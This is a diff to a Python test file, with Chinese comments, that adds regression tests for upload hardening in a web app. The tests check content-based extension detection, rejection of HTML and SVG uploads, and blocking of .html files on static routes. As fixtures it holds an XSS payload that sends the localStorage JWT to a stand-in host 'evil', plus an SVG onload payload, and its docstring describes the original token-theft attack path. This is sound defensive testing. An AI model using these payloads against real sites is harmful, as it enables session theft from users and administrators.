@@ -564,11 +564,16 @@ class TestAgentFileUpload:
         assert resp.status_code == 200
 
     def test_upload_xlsx_file(self, auth_headers):
+        # 用真实 xlsx（zip 容器），因为扩展名现在由服务端按内容判定
+        import openpyxl
+        buf = io.BytesIO()
+        openpyxl.Workbook().save(buf)
         resp = client.post("/product-db/api/agent/upload",
-                           files={"file": ("test.xlsx", io.BytesIO(b"PK" + b"\x00"*100),
+                           files={"file": ("test.xlsx", io.BytesIO(buf.getvalue()),
                                   "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
                            headers=auth_headers)
         assert resp.status_code == 200
+        assert resp.json()["url"].endswith(".xlsx")
 
     def test_upload_disallowed_type(self, auth_headers):
         resp = client.post("/product-db/api/agent/upload",
@@ -583,6 +588,116 @@ class TestAgentFileUpload:
                            files={"file": ("big.txt", io.BytesIO(big), "text/plain")},
                            headers=auth_headers)
         assert resp.status_code == 400
+
+
+# ============================================================
+# 上传加固：扩展名必须由服务端按内容决定
+# ============================================================
+_PNG_BYTES = b"\x89PNG\r\n\x1a\n" + b"\x00" * 24
+_JPG_BYTES = b"\xff\xd8\xff\xe0" + b"\x00" * 24
+_XSS_HTML = b"<script>new Image().src='//evil/?t='+localStorage.getItem('token')</script>"
+
+
+def _xlsx_bytes() -> bytes:
+    import openpyxl
+    buf = io.BytesIO()
+    openpyxl.Workbook().save(buf)
+    return buf.getvalue()
+
+
+class TestUploadHardening:
+    """回归：agent 上传曾采信客户端 Content-Type 并把文件名扩展名原样落盘，配合
+    uploads 目录的无鉴权静态托管，可以存出 .html（Content-Type 谎报 image/png），
+    再诱导管理员打开 → 与主站同源执行脚本、读走 localStorage 里的 JWT。
+    现在扩展名一律由服务端按内容判定，静态服务只放行白名单扩展名且加 nosniff。"""
+
+    @staticmethod
+    def _uploads_dir():
+        from app.services.storage import UPLOAD_DIR
+        return UPLOAD_DIR
+
+    @pytest.mark.parametrize("content,filename,expected", [
+        (_PNG_BYTES, "a.png", ".png"),
+        (_PNG_BYTES, "attack.html", ".png"),      # 内容为准，文件名不作数
+        (_JPG_BYTES, "a.jpeg", ".jpg"),
+        (b"%PDF-1.4\n%abc", "b.pdf", ".pdf"),
+        (b"BM" + b"\x00" * 12 + b"\x28\x00\x00\x00" + b"\x00" * 8, "c.bmp", ".bmp"),
+        (b"hello world", "d.txt", ".txt"),
+        (b'{"a":1}', "e.json", ".json"),
+        (b"# title", "f.md", ".md"),
+        (_XSS_HTML, "x.html", ""),                # HTML 一律拒绝
+        (b"<svg onload=alert(1)/>", "x.svg", ""),  # SVG 一律拒绝
+        (b"MZ\x90\x00" + b"\x00" * 20, "evil.exe", ""),
+        (b"\x00\x01\x02\x03", "raw.bin", ""),
+        (b"PK\x03\x04" + b"\x00" * 40, "fake.xlsx", ""),  # 假 zip 不算 xlsx
+    ])
+    def test_detect_upload_extension(self, content, filename, expected):
+        from app.services.storage import detect_upload_extension
+        assert detect_upload_extension(content, filename) == expected
+
+    def test_detect_real_xlsx_and_docx(self):
+        from app.services.storage import detect_upload_extension
+        assert detect_upload_extension(_xlsx_bytes(), "t.xlsx") == ".xlsx"
+        assert detect_upload_extension(_xlsx_bytes(), "t.docx") == ".xlsx", "以内容为准"
+
+    def test_html_with_spoofed_content_type_is_rejected(self, auth_headers):
+        """核心回归：文件名 x.html + Content-Type image/png + HTML 内容 → 400 且不落盘。"""
+        uploads = self._uploads_dir()
+        before = {p.name for p in uploads.iterdir()}
+        resp = client.post("/product-db/api/agent/upload",
+                           files={"file": ("x.html", io.BytesIO(_XSS_HTML), "image/png")},
+                           headers=auth_headers)
+        assert resp.status_code == 400
+        assert {p.name for p in uploads.iterdir()} == before, "被拒的上传不得留下任何文件"
+
+    def test_content_mismatch_is_rejected(self, auth_headers):
+        """文件名与 Content-Type 都声称 PNG，内容却是 HTML → 400。"""
+        resp = client.post("/product-db/api/agent/upload",
+                           files={"file": ("x.png", io.BytesIO(b"<html>hi</html>"), "image/png")},
+                           headers=auth_headers)
+        assert resp.status_code == 400
+
+    def test_svg_with_spoofed_content_type_is_rejected(self, auth_headers):
+        resp = client.post("/product-db/api/agent/upload",
+                           files={"file": ("x.svg", io.BytesIO(b'<svg onload="alert(1)"/>'), "image/png")},
+                           headers=auth_headers)
+        assert resp.status_code == 400
+
+    def test_extension_follows_content_not_filename(self, auth_headers):
+        """真实 PNG 内容 + .html 文件名 → 存成 .png（服务端决定扩展名）。"""
+        resp = client.post("/product-db/api/agent/upload",
+                           files={"file": ("attack.html", io.BytesIO(_PNG_BYTES), "image/png")},
+                           headers=auth_headers)
+        assert resp.status_code == 200
+        url = resp.json()["url"]
+        assert url.endswith(".png") and "html" not in url
+        self._cleanup(url)
+
+    def test_static_serving_blocks_executable_extensions(self):
+        """静态托管不再服务 .html（含历史遗留文件），两个挂载点都要挡。"""
+        d = self._uploads_dir()
+        name = "_pytest_exec.html"
+        (d / name).write_bytes(_XSS_HTML)
+        try:
+            assert client.get(f"/product-db/api/uploads/{name}").status_code == 404
+            assert client.get(f"/api/uploads/{name}").status_code == 404
+        finally:
+            (d / name).unlink(missing_ok=True)
+
+    def test_static_serving_allows_images_with_nosniff(self):
+        d = self._uploads_dir()
+        name = "_pytest_ok.png"
+        (d / name).write_bytes(_PNG_BYTES)
+        try:
+            resp = client.get(f"/product-db/api/uploads/{name}")
+            assert resp.status_code == 200
+            assert resp.headers.get("x-content-type-options") == "nosniff"
+        finally:
+            (d / name).unlink(missing_ok=True)
+
+    def _cleanup(self, url: str):
+        from app.services.storage import delete_file
+        delete_file(url)
 
 
 # ============================================================
